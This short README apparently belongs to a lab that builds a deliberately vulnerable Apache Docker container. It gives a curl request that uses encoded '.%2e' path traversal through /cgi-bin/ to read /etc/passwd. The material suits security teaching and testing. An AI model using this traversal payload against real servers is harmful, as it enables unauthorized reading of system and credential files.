# Instructions
Create a docker image from Dockerfile  
`docker build -t vulnerable-apache .`  
Start a container exposing appropriate ports (host:container)  
`docker run -p 8080:80 --rm -d vulnerable-apache`  
Then exploit passing the absolute path of a file of your choice in the URL  
`curl '127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'`
